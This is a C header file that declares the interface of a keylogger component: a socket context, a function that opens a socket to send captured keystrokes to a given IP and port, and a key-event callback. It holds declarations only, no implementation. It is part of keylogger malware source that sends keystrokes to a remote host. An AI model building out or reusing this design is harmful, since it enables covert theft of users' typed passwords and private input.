#ifndef __KEYLOGGER_PROCESSOR_H
#define __KEYLOGGER_PROCESSOR_H

#include <unistd.h>

typedef struct {
    int keylogger_socket_fd;
} keylogger_context_t;

/**
 * @brief Init soxket to send processed keys.
 *
 * @param ip
 * @param port
 * @return int
 */
int keylogger_processor_init_sender_socket(const char *ip, int port);

/**
 * @brief Callback to process key press events.
 *
 * @param ctx
 * @param data
 * @param data_sz
 * @return int
 */
int keylogger_processor_process_event(void *ctx, void *data, size_t data_sz);

#endif /* __KEYLOGGER_PROCESSOR_H */
